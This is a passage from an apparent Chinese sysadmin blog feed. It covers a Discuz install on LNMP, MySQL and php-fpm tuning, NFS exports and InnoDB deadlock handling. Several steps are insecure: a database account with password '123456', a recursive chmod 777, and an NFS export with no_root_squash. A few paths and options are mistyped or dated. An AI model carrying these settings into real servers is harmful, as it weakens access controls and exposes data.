&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新加载 nginx： 12[root@lnmp www]# service nginx reload 重新载入 Nginx： [确定] 3.配置 mysql ，给 Discuz！ 增加一个账户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给 mysql root 账户设置密码，谈后命令行进入 mysql ，创建新的库，并创建一个新的帐号对该库有所有权限： 12345678910[root@lnmp www]# /usr/local/mysql/bin/mysql -urootmysql&gt; create database discuz;Query OK, 1 row affected (0.02 sec) mysql&gt; grant all on discuz.* to 'yanyi'@'localhost' identified by '123456';Query OK, 0 rows affected (0.00 sec) mysql&gt; quitBye &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就创建了一个库 discuz ，然后有创建了一个用户 yanyi ，密码是 123456. 4.安装 Discuz！&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 123.com 这个域名是随便定义了一个，所以是不能直接访问的，需要先绑定 hosts ，其中hosts 在windows 和 linux 上都是存在的，可以把一个域名指向到一个 ip 上。windows 下的 hosts 文件路径是在： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c:\windows\system32\drivers\etc\hosts 。用记事本打开，然后增加一行，保存： 1192.168.0.98 123.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的 192.168.0.98 是虚拟机的 ip 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器输入：http://123.com/install/ ，打开页面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改 /data/ 权限 1[root@lnmp www]# chmod 777 -R /data/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这一步，数据库名，就是第三步创建的新数据库。数据库用户名和密码也是第三步创建的用户和密码。管理员密码一定要记得。点下一步后，就会看到安装数据库的过程，然后到 “discuz 应用中心”的页面，直接点右下角“点此访问”，就安装成功discuz 论坛了。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL调优]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F6.%20MySQL%E8%B0%83%E4%BC%98%2F</url>
    <content type="text"><![CDATA[MySQL调优&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL调优可以从几个方面来做： 架构层：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做从库，实现读写分离； 系统层次： 增加内存； 给磁盘做raid0或者raid5以增加磁盘的读写速度； 可以重新挂载磁盘，并加上noatime参数，这样可以减少磁盘的i/o; MySQL本身调优： 如果未配置主从同步，可以把bin-log功能关闭，减少磁盘i/o 在my.cnf中加上skip-name-resolve,这样可以避免由于解析主机名延迟造成mysql执行慢 调整几个关键的buffer和cache。调整的依据，主要根据数据库的状态来调试。如何调优可以参考5. 应用层次：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看慢查询日志，根据慢查询日志优化程序中的SQL语句，比如增加索引 调整几个关键的buffer和cache key_buffer_size 首先可以根据系统的内存大小设定它，大概的一个参考值：1G以下内存设定128M；2G/256M; 4G/384M;8G/1024M；16G/2048M.这个值可以通过检查状态值Key_read_requests和 Key_reads,可以知道key_buffer_size设置是否合理。比例key_reads / key_read_requests应该尽可能的低，至少是1:100，1:1000更好(上述状态值可以使用SHOW STATUS LIKE ‘key_read%’获得)。注意：该参数值设置的过大反而 会是服务器整体效率降低! table_open_cache 打开一个表的时候，会临时把表里面的数据放到这部分内存中，一般设置成1024就够了，它的大小我们可以通过这样的方法来衡量： 如果你发现 open_tables等于table_cache，并且opened_tables在不断增长，那么你就需要增加table_cache的值了(上述状态值可以使用SHOW STATUS LIKE ‘Open%tables’获得)。注意，不能盲目地把table_cache设置成很大的值。如果设置得太高，可能会造成文件描述符不足，从而造成性能不稳定或者连接失败。 sort_buffer_size 查询排序时所能使用的缓冲区大小,该参数对应的分配内存是每连接独占!如果有100个连接，那么实际分配的总共排序缓冲区大小为100 × 4 = 400MB。所以，对于内存在4GB左右的服务器推荐设置为4-8M。 read_buffer_size 读查询操作所能使用的缓冲区大小。和sort_buffer_size一样，该参数对应的分配内存也是每连接独享! join_buffer_size 联合查询操作所能使用的缓冲区大小，和sort_buffer_size一样，该参数对应的分配内存也是每连接独享! myisam_sort_buffer_size 这个缓冲区主要用于修复表过程中排序索引使用的内存或者是建立索引时排序索引用到的内存大小，一般4G内存给64M即可。 query_cache_size MySQL查询操作缓冲区的大小，通过以下做法调整：SHOW STATUS LIKE ‘Qcache%’; 如果Qcache_lowmem_prunes该参数记录有多少条查询因为内存不足而被移除出查询缓存。通过这个值，用户可以适当的调整缓存大小。如果该值非常大，则表明经常出现缓冲不够的情况，需要增加缓存大小;Qcache_free_memory:查询缓存的内存大小，通过这个参数可以很清晰的知道当前系统的查询内存是否够用，是多了，还是不够用，我们可以根据实际情况做出调整。一般情况下4G内存设置64M足够了。 thread_cache_size 表示可以重新利用保存在缓存中线程的数，参考如下值： 1G —&gt; 8 2G —&gt; 16 3G —&gt; 32 &gt;3G —&gt; 64 除此之外，还有几个比较关键的参数： thread_concurrency 这个值设置为cpu核数的2倍即可 wait_timeout 表示空闲的连接超时时间，默认是28800s，这个参数是和 interactive_timeout一起使用的，也就是说要想让wait_timeout 生效，必须同时设置 interactive_timeout，建议他们两个都设置为10 max_connect_errors 是一个MySQL中与安全有关的计数器值，它负责阻止过多尝试失败的客户端以防止暴力破解密码的情况。与性能并无太大关系。为了避免一些错误我们一般都设置比较大，比如说10000 max_connections 最大的连接数，根据业务请求量适当调整，设置500足够 max_user_connections 是指同一个账号能够同时连接到mysql服务的最大连接数。设置为0表示不限制。通常我们设置为100足够]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-fpm配置文件 高并发参数配置及linux内核参数优化]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F11.%20php-fpm%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[php-fpm配置文件 高并发参数配置及linux内核参数优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 之前给出了 php-fpm.conf 的内容，下面给出一个模版，配置如下 12345678910111213141516[global]pid = /usr/local/php/var/run/php-fpm.piderror_log = /usr/local/php/var/log/php-fpm.log[www]listen = /tmp/php-fcgi.sockuser = php-fpmgroup = php-fpmlisten.owner = nobody #和后面的nginx一致listen.group = nobody #同上pm = dynamicpm.max_children = 50pm.start_servers = 20pm.min_spare_servers = 5pm.max_spare_servers = 35pm.max_requests = 500rlimit_files = 1024 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[global] 部分是全局配置，指定 pid 文件路径以及 error_log 路径。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[www] 是一个 pool ，还可以再写第二个 pool ，第二个 pool 和第一个不易演的的地方，首先 pool 的 name ，比如叫做 [www2] 。然后 listen 肯定就不能一样了，比如 可以 listen = /tmp/php-fcgi2.sock 。而 user ， group 也可以和 [www] 中定义的不一样。 listen.owner 这个是定义 /tmp/php-fcgi2.sock 这个文件的所有者是谁，在 php5.4 版本之后监听的 socket 文件权限默认变成了 600，如果不定义 listen.owner 那么 nginx 调用这个 socket 的时候就没有权限了，所以在这里定义 listen.owner 为 nginx 的子进程监听用户。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pm = dynamic 表示以动态的形式启动，在 php5.3 版本以后它可以支持动态和静态了，如果是静态，即 pm = static 时，下面的配置只有 pm.max.children 管用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pm.max.children 表示启动几个 php-fpm 的子进程。如果是 dynamic ，下面的配置会生效，pm.max.children 表示最大可以启动几个子进程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pm.start_servers 表示一开始启动几个子进程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pm.max_requeste 表示一个子进程最多可以接受多少个请求，比如设置为500那么一个子进程手里500个请求后自动销毁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rlimit_files 表示每个子进程打开的多少个文件句柄。 12slowlog = /tmp/www_slow.logrequest_slowlog_timeout = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示一个脚本执行时间超过 1秒就要记录这个slow.log ，记录这个可以看到这个脚本哪里执行慢，可以通过slow.log排查网站慢的原因，根据这个原因做一定的优化。 1php_admin_value [open_basedir] = /data/www/:/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache 可以设置 open_basedir ，php-fpm也可以，不同的 pool 设置不同的 open_basedir 可以针对不同的域名进行不同的限制。多个目录用 ：分割。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL配置讲解]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F5.%20MySQL%E9%85%8D%E7%BD%AE%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[MySQL配置讲解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql 安装好后，是从安装包的 support-files 里面复制过来一个模板配置文件，默认 mysql 配置文件是在 /etc/my.cnf 下，其实这个路径或者文件名字是可以修改的，在启动脚本中修改。 12[mysqld]socket = /tmp/mysql.sock &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为 MySQL 客户程序与服务器之间的本地通信指定一个套接字文件（ linux 下默认是 /var/lib/mysql/mysql.sock ） 1port = 3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定 MySQL 监听的端口 1skip-name-resolve &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;禁止 MySQL 对外部连续进行 DNS 解析，使用这一选项可以消除 MySQL 进行 DNS 解析的时间。但需要注意，如果开启选项，则所有远程主机连接授权都要使用 IP 地址方式，否则 MySQL 将无法正常处理连接请求。 1key_buffer_size = 384M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;key_buffer 是用于索引块的缓冲区大小，增加它可得到更好处理的索引（对所有读和多重写）。索引被所有的线程共享， key_buffer 的大小视内存大小而定。（增加该值可以得到更好的处理索引的速度，一般1G内存设置256M） 1table_open_cache = 512 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; MySQL 每打开一个表，都会读入一些数据到 table_open_cache 缓存中，当 MySQL 在这个缓存中找不到相应信息时，才会去磁盘上读取。默认值 64 ，假定系统有200的并发连接，则需将此参数设置为 200*N （N 为每个连接所需的文件描述符数目）：当把 table_open_cache 设置为很大时，如果系统处理不了那么多文件描述符，那么就会出现客户端失效，连接补上。 1max_allowed_packet = 16M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接受的数据包大小；增加该变量的值十分安全，这是因为仅当需要时才会分配额外内存。例如，仅当发出长查询或 MySQLd 必须返回大的结果行时才会分配更多内存。该变量之所以取较小默认值是一种预防措施，以捕获客户端和服务器之间的错误信息包，并确保不会因偶然使用大的信息包而导致内存溢出。 1sort_buffer_size = 1M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL 执行排序使用缓冲大小。如果想要增加ORDER BY 的速度，首先看看是否可以让 MySQL 使用索引而不是额外的排序阶段。如果不能，可以尝试增加 sort_buffer_size 变量的大小。 1read_buffer_size = 2M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读查询操作所能使用的缓冲区大小。和 sort_buffer_size 一样，该参数对应的分配内存也是每连接独享。对表进行顺序扫描的请求将分配一个读入缓冲区， MySQL 会为它分配一段内容缓冲区。如果对表的顺序扫描请求非常频繁，并且任位频繁扫描进行得太慢，可以通过增加该变量值以及内存缓冲区大小提高其性能。 1join_buffer_size = 2M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;联合查询操作所能使用的缓冲区大小，和 sort_buffer_size 一样，该参数对应的分配内存也是每连接独享。 1query_cache_size = 32M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定 MySQL 查询结果缓冲区的大小。 1read_rnd_buffer_size = 8M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;随机读缓冲区大小。当按任意顺序读取行时（例如，按照排序顺序），将分配一个随机读缓冲区。进行排序查询时， MySQL 会首先扫描一遍该缓冲，以比秒磁盘搜索，提高查询速度，如果需要排序大量数据，可适当调高该值。但 MySQL 会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大。 1myisam_sort_buffer_size = 64M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MyISAM表发生变化时重新排序所需的缓冲。 1thread_concurrency = 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最大并发线程数，取值为服务器逻辑 CPU 数量 ×2 1thread_cache_size = 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该值表示可以重新利用保存在缓存中线程的数量，当断开连接时若缓存中还有空间，那么客户端的线程将被放到缓存中，如果线程重新被请求，那么请求将从缓存中读取，如果缓存中是空的或者是新的请求，那么线程将被重新创建。设置规律为：1G内存设置为8，2G内存设置为16，4G内存以上设置为64 1max_connections = 1000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL 的最大连接数，如果服务器的并发连接请求量比较大，建立调高此值，以增加并行连接数量，当然这建立在机器能支撑的情况下，因为如果连接数越多，介于 MySQL 会为每个连接提供连接缓冲区，就会开销越多的内存，所以要适当调整该值，不能盲目提高设值。可以过 ‘conn%’ 通配符查看当前状态的连接数量，以定夺该值的大小。 1max_connect_errors = 6000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于同一主机，如果有超出该参数值个数的中断错误连接，则该主机将被禁止连接。如需对该主机进行解禁，执行 FLUSH HOST 1open_files_limit = 65535 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL 打开的文件描述符限制，默认大小1024 1skip-locking &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;避免 MySQL 的外部锁定，减少出错几率增强稳定性。（是否要过滤掉 lock 为了让它更快一点可以把锁过滤掉） 1wait_timeout = 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示空闲的连接超时时间，默认是28800s，这个参数是和 interactive_timeout 一起使用的，也就是说要想让 wait_timeout 生效，必须同时设置 interactive_timeout 12interactive_timeout = 8long_query_time = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;慢查询入职的超时时间 1log_slow_queries = /path/to/slow_queries &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;慢查询日志路径，必须配合上面的参数一同使用]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nfs部署和优化]]></title>
    <url>%2F2017%2F08%2F10%2FNFS%2F1.%20nfs%E9%83%A8%E7%BD%B2%E5%92%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[nfs部署和优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NFS = network file system &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NFS服务比较常用，用于在网络上共享储存。 服务端配置 NFS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos 上使用 NFS 服务，需要安装两个包（nfs-utils 和 rpcbind），不过当使用 yum 安装 nfs-utils 时会把 rpcbind 一起安装上 1[root@localhost ~]# yum install -y nfs-utils rpcbind &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在以前的 centos 版本中，是需要安装 portmap 包的，从 centos 6 开始，就改为rpcbind了。NFS 配置起来很简单，只需要编辑配置文件 /etc/exports 即可。先创建一个简单的 NFS 服务器。 1[root@localhost ~]# vim /etc/exports &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入一下内容： 1/home/ 192.168.0.0/24(rw,sync,all_squash,anonuid=501,anongid=501) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个配置文件就这样简单一行。共分为三部分，第一部分就是本地要共享出去的目录，第二部分为允许访问的主机（可以是一个 IP 也可以是一个 IP 段），第三部分就是小括号里面的，为一些权限选项。 rw： 读写； ro： 只读； sync： 同步模式，内存中数据时时写入磁盘； async： 不同步，把内存中数据定期写入磁盘中； no_root_squash： 加上这个选项后，root 用户就会对共享的目录拥有至高的权限控制，就像是对本机的目录操作一样。但这样不安全，不建议使用。 roo_squash： 和上面的选项对应，root 用户对共享目录权限不高，只有普通用户的权限，即限制了 root 。 all_squash： 不管使用 NFS 的用户是谁，他的身份都会被限定成一个指定的普通用户身份。 anonuid/anongid： 要和root_squash 以及 all_squash一同使用，用于指定使用 NFS 的用户限定后的 uid 和 gid ，前提是本机的 /etc/passwd 存在这个 uid 和 gid 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在分析一下刚才配置的那个 /etc/exports 文件。其中共享的目录为 /home ，信任的主机为 192.168.0.0/24 这个网段，权限为读写，同步，限定所有使用者，并且限定 uid 和 gid 都为501. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;编辑好配置文件后，就该启动服务了 ： 1234567[root@localhost ~]# service rpcbind start正在启动 rpcbind： [确定][root@localhost ~]# service nfs start启动 NFS 服务： [确定]启动 NFS mountd： [确定]启动 NFS 守护进程： [确定]正在启动 RPC idmapd： [确定] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在启动服务以前，需要先启动 rpcbind 服务，以前的 centos 老版本中并不是 rpcbind ，而是叫做 portmap。 客户端上挂载 NFS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端挂载 NFS 以前，需要先查看服务端都共享了哪些目录，需要使用 showmount 命令，但这个命令是 nfs-utils 这个包带的，所以同样需要安装 nfs-utils 1[root@192 ~]# yum install -y nfs-utils &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在可以查看服务器端都共享了那些目录了 123[root@192 ~]# showmount -e 192.168.0.73Export list for 192.168.0.73:/home 192.168.0.0/24 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：其中 192.168.0.73 为 NFS 服务端 IP。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到在服务器端配置的 nfs 共享信息。showmount -e 加 ip 就可以查看 nfs 的共享情况，可以看到 192.168.0.73 的共享目录为 /home ，信任主机为 192.168.0.0/24 这个网段。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的命令是在客户端上挂载 nfs ： 1[root@192 ~]# mount -t nfs -o nfsvers=3 192.168.0.73:/home/ /mnt/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： -o 后面跟挂载选项，如果不加 -o nfsvers=3 则在挂载目录下的文件属主和组都是 nobody，如果指定 nfsers=3 则显示501，所以尽量加上这个选项，避免权限混乱。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 df -h 命令可以查看到多出来的一个 /mnt 分区，它就是 NFS 共享的目录了。 命令 exportfs&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一个常用的命令就是 exportfs ，它的常用选项为 [-aruv] -a： 全部挂载或者卸载； -r： 重新挂载； -u： 卸载某一个目录； -v： 显示共享的目录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 exportfs 命令，当改变 /etc/exports 配置文件后，不用重启 nfs 服务直接用这个 exportfs 即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面先更改服务端的配置： 1[root@192 ~]# vim /etc/exports &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一行： 1/tmp/ 192.168.0.0/24(rw,sync,no_root_squash) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后服务端上执行命令： 123[root@192 ~]# exportfs -arvexporting 192.168.0.0/24:/tmpexporting 192.168.0.0/24:/home &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在之前的命令中用到了 mount 命令来挂载 nfs ，其实 mount 这个 nfs 服务还是有些说法的。首先是用 -t nfs 来指定挂载的类型为 nfs 另外在使用 nfs 时，常用一个选项就是 -o nolock 了，即在挂载 nfs 服务时，不加锁。在客户端上执行： 12[root@192 ~]# mkdir /test[root@192 ~]# mount -t nfs -o nolock 192.168.0.73:/tmp/ /test/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以把要挂载的 nfs 目录写到 client 上的 /etc/fstab 文件中，挂载时只需要执行 mount -a 即可。在 /etc/fstab 里加一行： 123[root@192 ~]# vim /etc/fstab1192.168.0.73:/tmp/ /test nfs nolock 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为刚挂载过，所以先卸载： 1[root@192 ~]# umount /test/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后执行： 1[root@192 ~]# mount -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样也可以挂载上，而且以后开机会自动挂载。]]></content>
      <tags>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库死锁原理及解决思路]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F37.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%AD%BB%E9%94%81%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[数据库死锁原理及解决思路一、什么是锁？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据库是一个多用户使用的共享资源。当多个用户并发地存取数据时，在数据库中就会产生多个事务同时存取同一数据的情况。若对并发操作不加控制就可能会读取和存储不正确的数据，破坏数据库的一致性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加锁的目的确保并发更新场景下的数据正确性。当事务在对某个数据对象进行操作前，先向系统发出请求，对其加锁。加锁后事务就对该数据对象有了一定的控制，在该事务释放锁之前，其他的事务不能对此数据对象进行更新操作。 1.锁的持有周期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加锁：实际访问到某个待更新的行时，对其加锁（而非一开始就将所有的锁都一次性持有） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解锁：事务提交/回滚时（而非语句结束时就释放） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;持有周期就是加锁和解锁之间的实际时间。 2.锁粒度：库、表、页、行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁的粒度越细，并发级别越高（实现也更复杂） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;传统关系型数据库，都实现了行级别的锁 3.常见的加锁操作 –Insert、Delete、Update（毫无疑问） –Select … lock in share mode、select … for update（显式加锁） –Lock table … read/write （显示加表级锁） –Alter table … / Create Index … （DDL操作引入的加锁） –Flush tables with read lock （备份常用） –Primary Key/Unique Key唯一约束检查 4.常规锁模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;共享（S)锁：多个事务可封锁一个共享页；任何事务都不能修改该页； 通常是该页被读取完毕，S锁立即被释放。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;排它（X)锁：仅允许一个事务封锁此页；其他任何事务必须等到X锁被释放才能对该页进行访问；X锁一直到事务结束才能被释放。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更新（U)锁：用来预定要对此页施加X锁，它允许其他事务读，但不允许再施加U锁或X锁；当被读取的页将要被更新时，则升级为X锁；U锁一直到事务结束时才能被释放。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最容易理解的锁模式，读加共享锁，写加排它锁 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁的属性 LOCK_REC_NOT_GAP（锁记录，1024） LOCK_GAP（锁记录前的GAP，512） LOCK_ORDINARY（同时锁记录+记录前的GAP，0。传说中的Next Key锁） LOCK_INSERT_INTENTION（插入意向锁，2048） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上LOCK_GAP，一切难以理解的源头（后面重点分析） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁组合（属性 + 模式） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁的属性可以与锁模式任意组合。例如：LOCK_REC_NOT_GAP（1024） + LOCK_X（3） 二、什么又是死锁？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;死锁发生在当多个事务访问同一数据对象时，其中每个事务拥有的锁都是其他事务所需的，由此造成每个事务都无法继续下去。简单的说，事务A等待事务B释放他的资源，B又等待A释放他的资源，这样就互相等待就形成死锁。 三、产生死锁的原因： 系统资源不足。 事务运行推进的顺序不合适。3.资源分配不当等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果系统资源充足，该事务的资源请求都能够得到满足，死锁出现的可能性就很低，否则就会因争夺有限的资源而陷入死锁。其次，事务运行推进顺序与速度不同，也可能产生死锁。 四、产生死锁的四个必要条件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要下面四个条件有一个不具备，系统就不会出现死锁。 互斥条件。存在多个并发事务（2个或者以上），而某数据对象在一段时间内只能由一个事务占有，不能同时被两个或两个以上的事务占有。如果此时还有其它事务请求该数据对象，则请求者只能等待，直至占有该数据对象的事务用毕释放。 不可抢占条件。该事务所获得的数据对象在未使用完毕之前，其他事务不能强行地从该事务手中获取该数据对象，而只能由该事务自行释放。 占有且申请条件。某事务都已经占有了一个数据对象，为了完成事务逻辑，还必须更新的数据对象，但是此新的数据对象又被其他事务在占用，但是它在等待新数据对象的时候，仍然占有已占有的数据对象。 循环等待条件。存在一个事务等待序列{P1，P2，…，Pn}，其中P1等待P2所占有的某一资源，P2等待P3所占有的某一源，……，而Pn等待P1所占有的的某一资源，形成一个事务循环等待环。 五、如何避免死锁？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;死锁的关键在于：两个(或以上)的Session加锁的顺序不一致。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打破上述四个条件中的一个，常见解决思路有以下几中： 按同一顺序访问对象。(注：避免出现循环) 避免事务中的用户交互。(注：减少持有资源的时间，较少锁竞争)因为运行没有用户交互的批处理的速度要远远快于用户手动响应查询的速度。 保持事务简短并处于一个批处理中。(注：同(2)，减少持有资源的时间) 使用较低的隔离级别。(注：使用较低的隔离级别（例如已提交读）比使用较高的隔离级别（例如可序列化）持有共享锁的时间更短，减少锁竞争) 使用基于行版本控制的隔离级别 使用绑定连接。 六、死锁的排查解决办法（以mysql innodB为例）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;死锁出现的报错信息：“Deadlock found when trying to get lock;” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如何排查死锁成因。 通过应用业务日志定位到问题代码，找到相应的事务对应的sql； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为死锁被检测到后会回滚，这些信息都会以异常反应在应用的业务日志中，通过这些日志我们可以定位到相应的代码，并把事务的sql给梳理出来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1show engine innodb status\G; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般来说，死锁的原因和处理方式有很多种，主要是数据库系统在设计阶段就要考虑，所以再深入的研究和了解只能专业去研究了，在此不细究。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读锁定 1mysql&gt;LOCK TABLES tbl_name READ; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;验证： 1show OPEN TABLES where In_use &gt; 0; #查询是否锁表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写锁定 1mysql&gt;LOCK TABLES tbl_name WRITE; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解锁（有两种）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一种 1mysql&gt;UNLOCK TABLES; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二种 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;步骤： 1234567mysql -uxxx -pxxx -h服务器ip --port=服务器端口;（如果服务器设置了ip和端口访问的话，一定要带ip和端口）show OPEN TABLES where In_use &gt; 0; #查询是否锁表SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; #查看正在锁的事务SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; #查看等待锁的事务mysql&gt; show processlist; #查看正在执行的sql （show full processlist;查看全部sql）mysql&gt; kill id #杀死sql进程； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果进程太多找不到，就重启mysql 1/ect/init.d/mysql restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 12/ect/init.d/mysql stop #如果关不掉就直接kill -9 进程id /ect/init.d/mysql start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;去看看mysql日志文件是否保存死锁日志： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用目录：/var/log/mysqld.log； 七、表级锁的加锁和解锁过程（以mysql innodB为例）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql 的 表锁 lock tables 感觉就像一个 封闭的空间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql发现 lock tables 命令的时候,会将带有锁标记的表(table) 带入封闭空间,直到 出现 unlock tables 命令 或 线程结束, 才关闭封闭空间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入封闭空间时 , 仅仅只有锁标记的表(table) 可以在里面使用,其他表无法使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;锁标记 分为 read 和 write 下面是 两种 锁的区别 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如 将 table1 设为read锁, table2 设为write锁, table3 设为read锁 1lock tables [table1] read,[table2] write,[table3] read; 